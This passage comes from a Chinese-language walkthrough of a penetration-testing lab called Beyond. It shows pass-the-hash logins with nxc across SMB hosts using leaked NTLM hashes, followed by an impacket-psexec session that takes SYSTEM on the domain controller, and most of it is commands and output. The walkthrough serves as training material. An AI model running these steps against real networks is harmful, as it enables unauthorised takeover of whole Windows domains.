SMB         172.16.180.241  445    INTERNALSRV1     [+] INTERNALSRV1\Administrator:76821e8eeb84c0ec6446dbcc40ee2c99 (Pwn3d!)
```
證實 `INTERNALSRV1` 的本機管理員密碼與 `MAILSRV1` 相同，我們擁有了該伺服器的控制權。

接著測試 Domain Admin `beccy` 的哈希值在域內各主機的權限：
```bash
┌──(kali㉿kali)-[~/Desktop/Beyond]
└─$ nxc smb 172.16.x.0 -u beccy -H f0397ec5af49971f6efbdb07877046b3
SMB         172.16.180.243  445    CLIENTWK1        [+] beyond.com\beccy:f0397ec5af49971f6efbdb07877046b3 (Pwn3d!)
SMB         172.16.180.241  445    INTERNALSRV1     [+] beyond.com\beccy:f0397ec5af49971f6efbdb07877046b3 (Pwn3d!)
SMB         172.16.180.240  445    DCSRV1           [+] beyond.com\beccy:f0397ec5af49971f6efbdb07877046b3 (Pwn3d!)
SMB         172.16.180.254  445    MAILSRV1         [+] beyond.com\beccy:f0397ec5af49971f6efbdb07877046b3 (Pwn3d!)
```
結果確認域管理員 `beccy` 對全域內的所有主機（包括域控制器 DCSRV1）皆擁有最高的 `Pwn3d!` 權限。

### 👑 域控拿下 (DC PWN)
利用 `beccy` 的 Hash 使用 `psexec` 登入網域控制器 `172.16.180.240` (DCSRV1)：
```bash
┌──(kali㉿kali)-[~/Desktop/Beyond]
└─$ impacket-psexec -hashes :f0397ec5af49971f6efbdb07877046b3 beccy@172.16.180.240 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 172.16.180.240.....
[*] Found writable share ADMIN$
[*] Uploading file TjFHuIVd.exe
[*] Opening SVCManager on 172.16.180.240.....
[*] Creating service tBOJ on 172.16.180.240.....
[*] Starting service tBOJ.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.1006]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```
成功取得整個 Beyond.com 網域控制器的最高管理權限 `nt authority\system`。
Beyond 靶機滲透完成。
